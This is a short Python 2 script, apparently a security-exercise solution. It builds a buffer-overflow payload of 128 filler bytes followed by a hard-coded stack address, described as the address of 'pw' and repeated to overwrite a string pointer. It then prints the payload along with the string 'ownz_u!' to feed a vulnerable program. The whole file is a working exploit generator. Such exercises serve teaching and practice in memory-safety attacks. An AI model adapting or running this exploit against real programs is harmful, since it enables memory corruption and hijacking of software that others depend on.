NUM_OF_BITS_IN_BYTE = 8
NUM_OF_BYTES_IN_WORD = 8
NUM_OF_BITS_IN_WORD = NUM_OF_BITS_IN_BYTE * NUM_OF_BYTES_IN_WORD

# memory address of pw
MEM_ADDR = 0x7fffffffe140
# convert memory address from hexadecimal to binary (string of length word size
# stripped of "0b" in front)
mem_addr_as_bin = bin(MEM_ADDR)[2:].zfill(NUM_OF_BITS_IN_WORD)
# convert memory address from binary to bytes
mem_addr_as_bytes = list(
    int(
        mem_addr_as_bin[i:i+NUM_OF_BITS_IN_BYTE], 2
        ) for i in range(0, len(mem_addr_as_bin), NUM_OF_BITS_IN_BYTE)
    )

# reverse bytes
mem_addr_as_bytes.reverse()

# convert bytes to characters
i = 0
while i < len(mem_addr_as_bytes):
    mem_addr_as_bytes[i] = chr(mem_addr_as_bytes[i])
    i += 1

# repeat bytes for evil string pointer
mem_addr_as_bytes *= 2

# 128 bytes for string length
overflow_str = ('a'*128 + ''.join(mem_addr_as_bytes))

# print output
print overflow_str
print 'ownz_u!'
